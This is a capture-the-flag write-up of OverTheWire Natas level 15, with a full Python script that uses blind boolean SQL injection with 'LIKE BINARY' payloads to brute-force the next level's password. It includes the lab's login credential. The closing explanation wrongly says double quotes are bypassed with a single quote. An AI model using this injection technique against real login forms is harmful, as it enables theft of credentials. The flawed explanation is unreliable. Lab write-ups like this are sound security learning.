# Natas Level 15 → 16

## Objective
Find the password for the next level 

## Vulnerability
SQL injection

## Reconnaissance
The page shows a login form with a username and a password field. The source code shows that the query often uses a double quote, that can be bypassed using input + ", for example natas15".

## Exploitation

### Steps
1. Create a script that does a bruteforce 
2. Since the code only checks wether a user exists or not, it can be tricked by putting " to escape the double quote, then add and password LIKE BINARY "%' + char + '%" #' to guess its password. Guessed characters will be put into a variable named "fltered".
3. Also there will be another loop that guesses the correct placement of each character in the variable "filtered", the output then will be put into a variable named "passwd"

### Payload / Method

```
import requests
from requests.auth import HTTPBasicAuth

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""
passwd = ""

for char in chars:
    Data = {'username': 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    req = requests.post('http://natas15.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas15', 'GB6USCJYJjwLyYhZUNkE1NwDueiTow6g'), data=Data)

    if 'exists' in req.text:
        filtered = filtered + char

for i in range(0,32):
    for char in filtered:
        Data = {'username': 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        req = requests.post('http://natas15.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas15', 'GB6USCJYJjwLyYhZUNkE1NwDueiTow6g'), data=Data)

        if 'exists' in req.text:
            passwd = passwd + char
            print(passwd)
            break

```

## Why It Works
This method works because the query uses double quotes that can be bypassed with a single quote
## What I Learned
Double quotes can actually be bypassed using a quote when inserting something on a field.